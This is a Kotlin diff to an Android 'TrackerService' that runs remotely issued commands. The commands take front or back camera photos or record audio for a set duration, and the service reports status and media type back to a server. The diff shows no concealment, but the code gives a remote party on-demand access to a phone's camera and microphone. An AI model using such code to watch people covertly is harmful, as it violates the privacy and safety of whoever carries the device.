@@ -194,19 +194,37 @@ class TrackerService : Service() {
             }
             "camera_front" -> {
                 Log.d(TAG, "Capturing front camera photo")
-                RemoteCaptureManager.capturePhoto(this@TrackerService, useFront = true) { success ->
+                RemoteCaptureManager.capturePhoto(
+                    context = this@TrackerService,
+                    useFront = true,
+                    commandId = commandId
+                ) { success ->
                     Log.d(TAG, "Front camera result: $success")
                     try {
-                        ApiClient.updateCommandStatus(commandId, if (success) "completed" else "failed")
+                        ApiClient.updateCommandStatus(
+                            commandId,
+                            if (success) "completed" else "failed",
+                            null,
+                            if (success) "image" else null
+                        )
                     } catch (e: Exception) {}
                 }
             }
             "camera_back" -> {
                 Log.d(TAG, "Capturing back camera photo")
-                RemoteCaptureManager.capturePhoto(this@TrackerService, useFront = false) { success ->
+                RemoteCaptureManager.capturePhoto(
+                    context = this@TrackerService,
+                    useFront = false,
+                    commandId = commandId
+                ) { success ->
                     Log.d(TAG, "Back camera result: $success")
                     try {
-                        ApiClient.updateCommandStatus(commandId, if (success) "completed" else "failed")
+                        ApiClient.updateCommandStatus(
+                            commandId,
+                            if (success) "completed" else "failed",
+                            null,
+                            if (success) "image" else null
+                        )
                     } catch (e: Exception) {}
                 }
             }
@@ -214,10 +232,19 @@ class TrackerService : Service() {
                 val duration = params?.optInt("duration", 30) ?: 30
                 Log.d(TAG, "Recording audio for ${duration}s")
                 ApiClient.updateCommandStatus(commandId, "delivered")
-                RemoteCaptureManager.recordAudio(this@TrackerService, duration) { success ->
+                RemoteCaptureManager.recordAudio(
+                    context = this@TrackerService,
+                    durationSeconds = duration,
+                    commandId = commandId
+                ) { success ->
                     Log.d(TAG, "Audio recording result: $success")
                     try {
-                        ApiClient.updateCommandStatus(commandId, if (success) "completed" else "failed")
+                        ApiClient.updateCommandStatus(
+                            commandId,
+                            if (success) "completed" else "failed",
+                            null,
+                            if (success) "audio" else null
+                        )
                     } catch (e: Exception) {}
                 }
             }
